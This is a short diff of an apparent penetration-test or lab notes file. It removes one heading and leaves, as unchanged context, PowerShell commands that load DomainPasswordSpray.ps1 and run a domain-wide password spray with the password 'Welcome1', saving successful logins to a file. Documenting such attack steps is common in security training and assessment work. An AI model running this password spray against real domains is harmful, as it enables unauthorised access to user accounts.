@@ -6,8 +6,6 @@
 
 > Terminal output is omitted; only commands & scripts are captured.
 
-## 1. `powershell` _(output omitted)_
-
 ```powershell
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
